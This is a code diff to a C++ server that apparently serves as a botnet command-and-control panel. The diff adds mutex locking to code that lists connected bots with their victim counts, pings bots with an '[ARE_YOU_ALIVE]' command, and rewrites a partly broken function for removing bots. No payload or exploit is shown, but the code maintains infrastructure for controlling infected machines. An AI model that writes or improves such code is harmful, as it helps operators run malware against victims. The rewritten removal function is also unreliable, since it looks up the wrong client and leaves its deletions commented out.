@@ -1,7 +1,5 @@
 #include "server.h"
 
-#include <string>
-
 #ifdef NDEBUG
 #define PRINT(a, b)
 #else
@@ -94,57 +92,60 @@ void server::getClientsData(std::string& command, std::vector<std::string>& para
 	if (!checkHash_(params[0])) return;
 
 	std::vector<std::string> output_params = {"5", "[IP-address]", "[Connected]", "[Messages]", "[Victims]", "[Ping]"};
-	std::unique_lock<std::mutex> lock(clients_data_m_);
-
-	for (auto& bot : clients_data_container_) {
-		output_params.push_back(bot.first);
-		output_params.push_back(bot.second.connected);
-		output_params.push_back(std::to_string(bot.second.msgs_from));
-		output_params.push_back(std::to_string(bot.second.victims));
-		output_params.push_back(std::to_string(bot.second.ping));
+	{
+		std::unique_lock<std::mutex> lock(clients_data_m_);
+		for (auto& bot : clients_data_container_) {
+			output_params.push_back(bot.first);
+			output_params.push_back(bot.second.connected);
+			output_params.push_back(std::to_string(bot.second.msgs_from));
+			output_params.push_back(std::to_string(bot.second.victims));
+			output_params.push_back(std::to_string(bot.second.ping));
+		}
 	}
 	client->send(msg_parser_.genCommand(command, output_params));
 }
 
 void server::removeClient(std::string& command, std::vector<std::string>& params, session* client) {
-	// if (params.size() < 2) return;
-	// if (!checkHash_(params[0])) return;
-	// std::unique_ptr<session> bot;
-	// size_t bot_id;
-	// {
-	// 	std::unique_lock<std::mutex> lock(clients_m_);
-	// 	for (auto const& [key, val] : clients_sessions_container_) {
-	// 		std::stringstream ip;
-	// 		ip << val->endpoint_;
-	// 		if (params[1] == ip.str()) {
-	// 			bot_id = key;
-	// 			bot = val;
-	// 			break;
-	// 		}
-	// 	}
-	// }
-	// bot->stop();
-	// {
-	// 	std::unique_lock<std::mutex> lock(clients_m_);
-	// 	clients_sessions_container_.erase(bot_id);
-	// }
+	if (params.size() < 2) return;
+	if (!checkHash_(params[0])) return;
+
+	auto ip = params[1];
+	auto id = clients_data_container_.find(client->ip_)->second.id;
+
+	PRINT("REMOVING CLIENT: ", ip);
+	{
+		std::unique_lock<std::mutex> lock(clients_session_m_);
+		if (clients_sessions_container_.find(id) != clients_sessions_container_.end()) {
+			// TODO: fix bug when removing bot from hashmap
+			// clients_sessions_container_.erase(id);
+		}
+	}
+	{
+		std::unique_lock<std::mutex> lock(clients_data_m_);
+		if (clients_data_container_.find(ip) != clients_data_container_.end()) {
+			// clients_data_container_.erase(ip);
+		}
+	}
 }
 
 void server::pingClients() {
 	std::string command = "[ARE_YOU_ALIVE]";
 	std::vector<std::pair<size_t, std::string>> inactive_clients;
-
-	for (auto& client : clients_sessions_container_) {
-		++client.second->inactive_timeout_count_;
-		if (client.second->inactive_timeout_count_ >= INACTIVE_COUNTER_MAX) {
-			PRINT("Disconnecting due to inactivity client:", client.second->ip_);
-			inactive_clients.push_back(std::make_pair(client.second->id_, client.second->ip_));
-		} else {
-			if (clients_data_container_.find(client.second->ip_) == clients_data_container_.end()) {
-				continue;
+	{
+		std::unique_lock<std::mutex> lock_s(clients_session_m_);
+		std::unique_lock<std::mutex> lock_d(clients_data_m_);
+		for (auto& client : clients_sessions_container_) {
+			++client.second->inactive_timeout_count_;
+			if (client.second->inactive_timeout_count_ >= INACTIVE_COUNTER_MAX) {
+				PRINT("Disconnecting due to inactivity client:", client.second->ip_);
+				inactive_clients.push_back(std::make_pair(client.second->id_, client.second->ip_));
+			} else {
+				if (clients_data_container_.find(client.second->ip_) == clients_data_container_.end()) {
+					continue;
+				}
+				std::vector<std::string> output_params = {NONE_PARAMETERS};
+				client.second->send(msg_parser_.genCommand(command, output_params));
 			}
-			std::vector<std::string> output_params = {NONE_PARAMETERS};
-			client.second->send(msg_parser_.genCommand(command, output_params));
 		}
 	}
 
